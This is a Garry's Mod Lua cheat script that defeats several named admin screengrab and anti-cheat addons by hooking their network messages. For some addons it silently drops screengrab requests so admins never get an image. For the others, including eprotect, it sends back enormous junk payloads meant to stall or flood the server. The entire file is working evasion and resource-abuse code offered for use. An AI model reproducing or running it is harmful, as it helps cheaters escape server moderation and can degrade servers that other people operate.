--[[
	https://github.com/awesomeusername69420/miscellaneous-gmod-stuff

	Works for:
		https://steamcommunity.com/sharedfiles/filedetails/?id=1342030824
		https://steamcommunity.com/sharedfiles/filedetails/?id=2114254167
		https://www.gmodstore.com/market/view/leyscreencap-web-interface-screenshot-livestream
		https://www.gmodstore.com/market/view/eprotect-keep-exploiters-cheaters-at-bay
]]

local Len = 4294967295 -- UINT32_MAX; Length of data to send for each part
local Delay = 1 -- How many second to wait in between sending next part

local BigStr = string.rep("a", Len)
local BigData = util.Compress(util.Base64Encode(BigStr))
local BigLen = #BigData

local color_green = Color(0, 255, 0, 255)
local color_white = Color(255, 255, 255, 255)
local color_yellow = Color(255, 255, 0, 255)

local CurTime = CurTime
local LocalPlayer = LocalPlayer
local STNDRD = STNDRD

local timer_Create = timer.Create
local timer_Remove = timer.Remove

local net_Receive = net.Receive
local net_Receivers = net.Receivers
local net_SendToServer = net.SendToServer
local net_Start = net.Start
local net_WriteBit = net.WriteBit
local net_WriteColor = net.WriteColor
local net_WriteData = net.WriteData
local net_WriteEntity = net.WriteEntity
local net_WriteFloat = net.WriteFloat
local net_WriteString = net.WriteString
local net_WriteUInt = net.WriteUInt

local function NetReceiverExists(name)
	return net_Receivers[name:lower()] ~= nil
end

-- Basic screengrab addon

if NetReceiverExists("StartScreengrab") then
	local function cl_rtxappend2(color, text)
		net_Start("rtxappend2")
			net_WriteColor(color)
			net_WriteString(text)
			net_WriteEntity(LocalPlayer())
		net_SendToServer()
	end

	net_Receive("StartScreengrab", function()
		cl_rtxappend2(color_green, "Initializing")

		net_Start("ScreengrabInitCallback")
			net_WriteEntity(LocalPlayer())
			net_WriteUInt(Len, 32)
			net_WriteUInt(Len, 32)
			net_WriteFloat(CurTime())
		net_SendToServer()

		cl_rtxappend2(color_white, "Captured " .. Len .. " bytes")
		cl_rtxappend2(color_white, Len .. " parts")
		cl_rtxappend2(color_green, "Preparing to send data")

		local i = 1

		timer_Create("ScreengrabSendPart", Delay, Len, function()
			net_Start("ScreengrabSendPart")
				net_WriteUInt(BigLen, 32)
				net_WriteData(BigData, BigLen)
			net_SendToServer()

			net_Start("Progress")
				net_WriteEntity(LocalPlayer())
				net_WriteFloat((i / Len) / 2)
			net_SendToServer()

			cl_rtxappend2(color_yellow, "Sent " .. i .. STNDRD(i) .. " part")

			i = i + 1

			if i == Len then
				net_Start("ScreengrabFinished")
				net_SendToServer()
			end
		end)
	end)

	net_Receive("ScreengrabInterrupted", function()
		timer_Remove("ScreengrabSendPart")
	end)
end

-- Gimme That Screen

if NetReceiverExists("GimmeThatScreen_Request") then
	net_Receive("GimmeThatScreen_Request", function()
		--[[
			Just don't do anything and it'll load infinitely

			GTS has an "Authed" check and if the screengrab wasn't authorized it won't screengrab
			Doing nothing in here is the same as saying "That screengrab isn't authorized"
		]]
	end)
end

-- LeyScreenCap

if NetReceiverExists("LeyScreenCap") then
	net_Receive("LeyScreenCap", function()
		--[[
			Just don't do anything and the admin will get no event
		]]
	end)
end

-- eprotect
-- This is janky and can *sometimes* (rarely) get you kicked for malicious intent, beware

if NetReceiverExists("eP:Handeler") then
	net_Receive("eP:Handeler", function()
		net_Start("eP:Handeler")
			net_WriteBit(0)
			net_WriteUInt(1, 2)
			net_WriteUInt(1, 2)
			net_WriteString(BigStr)
		net_SendToServer()
	end)
end
